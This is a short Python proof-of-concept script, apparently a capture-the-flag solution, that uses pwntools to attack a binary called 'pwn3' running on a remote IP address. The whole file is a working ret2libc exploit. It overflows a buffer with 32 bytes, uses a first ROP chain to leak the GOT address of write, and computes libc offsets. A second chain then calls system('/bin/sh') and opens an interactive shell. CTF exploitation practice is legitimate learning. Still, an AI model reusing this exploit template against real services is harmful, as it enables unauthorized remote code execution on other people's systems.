#! /usr/bin/python
from pwn import *

#I push this poc just want to recommend pwntools
#It's a very great tool for pwn
#Althought you can very easy to write pwn poc with pwntools
#but don't depend it too much

#see pwntool's doc at : https://pwntools.readthedocs.org/en/latest/
#and the github : https://github.com/Gallopsled/pwntools
#dot't fear of english :)

def cal_rop2():    
    addr_libc = addr_write - libc.symbols['write']
    addr_system = addr_libc + libc.symbols['system']
    addr_sh = addr_libc + libc.search('/bin/sh').next()

    rop = ROP(binary)
    rop.call(addr_system,(addr_sh,))
    log.debug(rop.dump())
    return str(rop)

def cal_rop1():
    rop = ROP(binary)

    rop.write(1,binary.got['write'],4)
    rop.main()
    log.debug(rop.dump())
    return str(rop)

local = './pwn3'
so = './libc-2.19.so'
context.log_level = 'info'
binary = ELF(local)
libc = ELF(so)
#pwn = process(local)
pwn = remote('121.42.25.113',10003)

rop1 = cal_rop1()
pwn.send('a'*32 + rop1)
pwn.recv(20)
addr_write = u32(pwn.recv(4))

rop2 = cal_rop2()
pwn.send('a'*32+rop2)
pwn.recv()

log.warn('Now, I got the shell')

pwn.interactive()

